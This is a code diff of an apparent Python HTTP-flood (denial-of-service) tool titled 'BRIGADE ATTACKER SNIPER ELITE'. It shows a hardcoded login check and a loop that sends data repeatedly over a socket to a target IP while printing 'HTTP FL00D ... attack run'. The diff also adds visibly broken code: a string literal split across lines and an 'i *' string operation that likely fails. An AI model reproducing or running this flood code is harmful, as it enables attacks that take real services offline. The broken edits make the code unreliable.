@@ -31,16 +31,13 @@ class bcolors:
 attemps = 0
 os.system("clear")
 logo = """
-    ▓▒▓▒▓▒▓▒░     ▓▒▓▒░      ▓▒▓▒▓▒▓▒░   ▓▒▓▒▓▒▓▒░    ▓▒▓▒▓▒░       
-    ▓▒░     ▓▒░  ▓▒░  ▓▒░   ▓▒░          ▓▒░         ▓▒░  ▓▒░      
-    ▓▒░     ▓▒░ ▓▒░    ▓▒░  ▓▒░          ▓▒░             ▓▒░  
-    ▓▒▓▒▓▒▓▒░   ▓▒░    ▓▒░   ▓▒░▓▒░▓▒░   ▓▒░            ▓▒░  
-    ▓▒░     ▓▒░ ▓▒░    ▓▒░          ▓▒░  ▓▒▓▒▓▒▓▒░     ▓▒░  
-    ▓▒░     ▓▒░ ▓▒░▓▒▓▒▓▒░          ▓▒░  ▓▒░          ▓▒░  
-    ▓▒▓▒▓▒▓▒░   ▓▒░    ▓▒░   ▓▒▓▒▓▒▓▒░   ▓▒▓▒▓▒▓▒░    ▓▒▓▒▓▒▓▒░    
-    ▒░▒░▒░▒░     ▒░     ▒░     ▒░▒░▒▒░     ▒░▒░▒░▒░    ▒░▒░▒▒░    
-       ░▒ ░       ░      ░       ▒░ ░         ░ ▒░         ▒░▒░  
-        ▒░          ░   ░          ░            ░            ░  
+     ╔══════
+  ▓▓▓▓▓▓
+  ▓ 
+  ▓
+  ▓▓▓▓▓
+  ▓
+  ▓  ╚════
 ╔══════════════════════════════════════════════════════════════╗
  \033[33m                 BRIGADE ATTACKER SNIPER ELITE
  \033[94m              FREEDOM IS THE RIGHT OF ALL NATIONS
@@ -49,7 +46,8 @@ logo = """
 faded_text = fade.fire(logo)
 print(faded_text)
 while attemps < 100:
-    username = input("\033[33mEnter your username: \033[0m")
+    username = input("\033
+	[33mEnter your username: \033[0m")
     password = input("\033[32mEnter your password: \033[0m")
 
     if username == 'salman' and password == 'kondangan-dl':
@@ -87,7 +85,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" \033[33m::F A D H I L  \033[31mHTTP \033[32mFL00D  \033[36m" +str(ip)+ "\033[35m = \033[96mattack run\033[0m")
+			print(i *" \033[35mF A D H I L  \033[32mHTTP \033[33mFL00D  \033[96m" +str(ip)+ "\033[94m = \033[1mattack run\033[0m")
 		except:
 			s.close()
 			print(i +" \033[4mfinnaly run\033[0m")
